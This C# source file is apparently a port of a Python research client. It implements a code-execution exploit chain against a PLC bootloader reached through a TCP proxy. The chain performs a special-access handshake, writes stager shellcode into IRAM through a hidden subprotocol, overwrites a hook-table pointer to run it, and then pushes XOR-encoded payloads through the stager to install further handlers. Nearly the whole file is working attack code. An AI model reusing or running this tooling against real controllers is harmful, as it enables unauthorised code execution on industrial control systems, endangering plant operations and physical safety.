using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace S7_Csharp_Utility
{
    public class PlcCommunicator
    {
        private TcpClient _client;
        private NetworkStream _stream;
        private readonly Action<string> _log;

        #region Constants
        private const int MAX_MSG_LEN = 192 - 2;

        // Addresses ported from client.py
        private const uint IRAM_STAGER_START = 0x10030100;
        private const uint ADD_HOOK_TABLE_START = 0x1003ABA0;
        private const int DEFAULT_STAGER_ADDHOOK_IND = 0x20;
        private const int DEFAULT_SECOND_ADD_HOOK_IND = 0x1a;
        private const uint NEXT_PAYLOAD_LOCATION = 0x10010100;

        // Protocol constants
        private static readonly byte[] ANSW_ENTER_SUBPROTO_SUCCESS = { 0x80, 0x00 };
        private static readonly ushort[] SUBPROT_80_MODE_MAGICS = { 0, 0x3BC2, 0x9d26, 0xe17a, 0xc54f };
        private const int SUBPROT_80_MODE_IRAM = 1;
        #endregion

        public PlcCommunicator(Action<string> logger)
        {
            _log = logger;
        }

        public bool IsConnected => _client?.Connected ?? false;

        public async Task ConnectAsync(string host, int port)
        {
            if (IsConnected) Disconnect();

            _client = new TcpClient();
            _log($"Connecting to {host}:{port}...");
            try
            {
                await _client.ConnectAsync(host, port);
                _stream = _client.GetStream();
                _log("Successfully connected to PLC proxy.");
            }
            catch (Exception ex)
            {
                _log($"Error connecting to PLC proxy: {ex.Message}");
                _client = null;
            }
        }

        public void Disconnect()
        {
            _stream?.Close();
            _client?.Close();
            _client = null;
            _log("Disconnected from PLC proxy.");
        }

        #region Core Protocol
        private byte CalculateChecksum(byte[] packetData, int offset, int length)
        {
            int sum = 0;
            for (int i = 0; i < length; i++)
            {
                sum += packetData[offset + i];
            }
            return (byte)-sum;
        }

        public async Task SendPacketAsync(byte[] contents, int step = 2, int sleepMs = 10)
        {
            if (contents.Length > MAX_MSG_LEN)
                throw new ArgumentException($"Message too long. Max length is {MAX_MSG_LEN} bytes.");

            var packet = new byte[contents.Length + 2];
            packet[0] = (byte)(contents.Length + 1);
            Array.Copy(contents, 0, packet, 1, contents.Length);
            packet[packet.Length - 1] = CalculateChecksum(packet, 0, packet.Length - 1);

            _log($"-> SEND: {BitConverter.ToString(packet).Replace("-", "")}");

            for (int i = 0; i < packet.Length; i += step)
            {
                int bytesToSend = Math.Min(step, packet.Length - i);
                await _stream.WriteAsync(packet, i, bytesToSend);
                if (sleepMs > 0) await Task.Delay(sleepMs);
            }
        }

        public async Task<byte[]> ReceivePacketAsync(int timeoutMs = 2000)
        {
            var cancellationTokenSource = new CancellationTokenSource(timeoutMs);
            var token = cancellationTokenSource.Token;

            var lengthByte = new byte[1];
            await _stream.ReadAsync(lengthByte, 0, 1, token);
            int bytesToRead = lengthByte[0];

            if (bytesToRead == 0) return Array.Empty<byte>();

            var fullPacket = new byte[bytesToRead + 1];
            fullPacket[0] = lengthByte[0];

            int bytesRead = 0;
            while(bytesRead < bytesToRead)
            {
                bytesRead += await _stream.ReadAsync(fullPacket, 1 + bytesRead, bytesToRead - bytesRead, token);
            }

            _log($"<- RECV: {BitConverter.ToString(fullPacket).Replace("-", "")}");

            byte receivedChecksum = fullPacket.Last();
            byte calculatedChecksum = CalculateChecksum(fullPacket, 0, fullPacket.Length - 1);

            if (receivedChecksum != calculatedChecksum)
            {
                _log("CHECKSUM ERROR!");
                return null;
            }

            var contents = new byte[bytesToRead - 1];
            Array.Copy(fullPacket, 1, contents, 0, contents.Length);
            return contents;
        }

        public async Task<byte[]> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
        {
            var payload = new byte[1 + args.Length];
            payload[0] = handlerIndex;
            Array.Copy(args, 0, payload, 1, args.Length);
            await SendPacketAsync(payload);
            return awaitResponse ? await ReceivePacketAsync() : null;
        }
        #endregion

        #region Stager/Exploit Chain
        public async Task<bool> PerformHandshakeAsync()
        {
            _log("Starting handshake...");
            byte[] magic = Encoding.ASCII.GetBytes("MFGT1");
            byte[] padding = Encoding.ASCII.GetBytes("AAAA");
            var handshakePayload = padding.Concat(magic).ToArray();

            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < 500) // Try for 0.5 seconds
            {
                await _stream.WriteAsync(handshakePayload, 0, handshakePayload.Length);
                await Task.Delay(50);
                if (_stream.DataAvailable)
                {
                    var buffer = new byte[256];
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
                    // Expected response is \x05-CPU
                    if (bytesRead >= 5 && buffer[0] == 5 && Encoding.ASCII.GetString(buffer, 1, 4) == "-CPU")
                    {
                        _log("Handshake successful, got special access greeting.");
                        return true;
                    }
                }
            }
            _log("Handshake failed.");
            return false;
        }

        public async Task<string> GetVersion()
        {
            _log("Getting bootloader version...");
            var response = await InvokePrimaryHandler(0, Array.Empty<byte>());
            string version = $"v{response[2]}.{response[3]}.{response[4]}";
            _log($"Got version: {version}");
            return version;
        }

        private async Task EnterSubprotocol(int mode)
        {
            _log($"Entering subprotocol mode {mode}...");
            ushort magic = SUBPROT_80_MODE_MAGICS[mode];
            byte[] payload = { (byte)(magic >> 8), (byte)magic };
            var response = await InvokePrimaryHandler(0x80, payload);
            if (!response.SequenceEqual(ANSW_ENTER_SUBPROTO_SUCCESS))
                throw new Exception("Failed to enter subprotocol.");
            _log("Entered subprotocol successfully.");
        }

        private async Task LeaveSubprotocol()
        {
            _log("Leaving subprotocol...");
            await SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 });
            await ReceivePacketAsync();
        }

        private async Task RawSubprotocolWrite(uint address, byte[] data)
        {
            var payload = new byte[7 + data.Length];
            payload[0] = 0x84;
            payload[1] = 0x5a;
            payload[2] = 0x2e;
            payload[3] = (byte)(address >> 24);
            payload[4] = (byte)(address >> 16);
            payload[5] = (byte)(address >> 8);
            payload[6] = (byte)address;
            Array.Copy(data, 0, payload, 7, data.Length);

            await SendPacketAsync(payload);
            await ReceivePacketAsync();
        }

        private async Task WriteChunkToIram(uint targetAddress, byte[] contents)
        {
            uint targetArgument = targetAddress - 0x10000000;
            // 1. Mask with 0xFF bytes
            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray());
            // 2. Write actual contents
            await RawSubprotocolWrite(targetArgument, contents);
        }

        public async Task WriteToIram(uint targetAddress, byte[] contents)
        {
            _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
            await EnterSubprotocol(SUBPROT_80_MODE_IRAM);

            int chunkSize = 16; // From python script
            for (int i = 0; i < contents.Length; i += chunkSize)
            {
                int size = Math.Min(chunkSize, contents.Length - i);
                var chunk = new byte[size];
                Array.Copy(contents, i, chunk, 0, size);
                _log($"Writing chunk {i / chunkSize + 1}...");
                await WriteChunkToIram(targetAddress + (uint)i, chunk);
            }

            await LeaveSubprotocol();
            _log("Finished writing to IRAM.");
        }

        public async Task InstallStager(byte[] stagerPayload)
        {
            _log("Starting stager installation...");
            // 1. Write stager shellcode to its location in IRAM
            await WriteToIram(IRAM_STAGER_START, stagerPayload);

            // 2. Overwrite an entry in the hook table to point to our stager
            _log("Overwriting hook table entry...");
            var hookEntryPayload = new byte[6];
            hookEntryPayload[0] = 0x00; // Arg length check part 1
            hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)

            // Pointer to the stager code
            hookEntryPayload[2] = (byte)(IRAM_STAGER_START >> 24);
            hookEntryPayload[3] = (byte)(IRAM_STAGER_START >> 16);
            hookEntryPayload[4] = (byte)(IRAM_STAGER_START >> 8);
            hookEntryPayload[5] = (byte)IRAM_STAGER_START;

            await WriteToIram(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
            _log("Stager installation complete.");
        }
        #endregion

        #region Stager Communication
        private byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                byte key = (byte)i;
                bool keyInChunk = chunk.Contains(key);
                bool keyIsLength = (key == chunk.Length + 2);
                if (!keyInChunk && !keyIsLength)
                {
                    var encoded = new byte[chunk.Length + 1];
                    encoded[0] = key;
                    for (int j = 0; j < chunk.Length; j++)
                    {
                        encoded[j + 1] = (byte)(chunk[j] ^ key);
                    }
                    return encoded;
                }
            }
            throw new Exception("Could not find a suitable XOR key to encode chunk.");
        }

        public async Task SendFullMsgViaStager(byte[] msg)
        {
            int maxChunkSize = MAX_MSG_LEN - 1;
            for (int i = 0; i < msg.Length; i += maxChunkSize)
            {
                int size = Math.Min(maxChunkSize, msg.Length - i);
                var chunk = new byte[size];
                Array.Copy(msg, i, chunk, 0, size);

                _log($"Stager send progress: {i}/{msg.Length}");

                var encoded = EncodePacketForStager(chunk);
                await SendPacketAsync(encoded, 8, 10);

                var ack = await ReceivePacketAsync();
                if (ack == null || ack.Length != 1)
                {
                    throw new Exception("Did not receive expected empty ACK from stager.");
                }
            }
            // Send empty packet to signify end of transmission
            await SendPacketAsync(EncodePacketForStager(Array.Empty<byte>()));
            await ReceivePacketAsync();
        }

        public async Task<byte[]> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
        {
            if (hookNo < 0 || hookNo > 0x20)
                throw new ArgumentOutOfRangeException(nameof(hookNo));

            var payload = new byte[1 + args.Length];
            payload[0] = (byte)hookNo;
            Array.Copy(args, 0, payload, 1, args.Length);

            return await InvokePrimaryHandler(0x1c, payload, awaitResponse);
        }

        public async Task WriteViaStager(uint address, byte[] contents)
        {
            var addressBytes = new byte[]
            {
                (byte)(address >> 24),
                (byte)(address >> 16),
                (byte)(address >> 8),
                (byte)address
            };
            await InvokeAddHook(DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
            await SendFullMsgViaStager(contents);
        }

        public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo)
        {
            // Set up function pointer and disable arbitrary argument length check
            var hookEntry = new byte[8];
            hookEntry[3] = 0xff; // Variable length
            hookEntry[4] = (byte)(targetAddress >> 24);
            hookEntry[5] = (byte)(targetAddress >> 16);
            hookEntry[6] = (byte)(targetAddress >> 8);
            hookEntry[7] = (byte)targetAddress;
            await WriteViaStager(ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry);

            // Write the code of the handler itself
            await WriteViaStager(targetAddress, payload);
        }

        public async Task<byte[]> ReceiveMany(IProgress<long> progress, int timeoutMs = 5000)
        {
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    var chunk = await ReceivePacketAsync(timeoutMs);
                    if (chunk == null || chunk.Length == 0)
                    {
                        break;
                    }
                    await ms.WriteAsync(chunk, 0, chunk.Length);
                    progress?.Report(ms.Length);
                }
                return ms.ToArray();
            }
        }
        #endregion
    }
}
